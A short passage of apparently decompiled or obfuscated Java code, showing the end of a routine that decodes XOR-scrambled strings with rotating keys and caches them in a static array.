                    array[n9] = (char)(c ^ n6);
                    n6 = (((n6 >>> 3 | n6 << 5) ^ charArray[i]) & 0xFF);
                }
                else {
                    array[n9] = (char)(c ^ n7);
                    n7 = (((n7 >>> 3 | n7 << 5) ^ charArray[i]) & 0xFF);
                }
            }
            Initializer_4.strArr_1[n3] = new String(charArray).intern();
        }
        return Initializer_4.strArr_1[n3];
    }
}
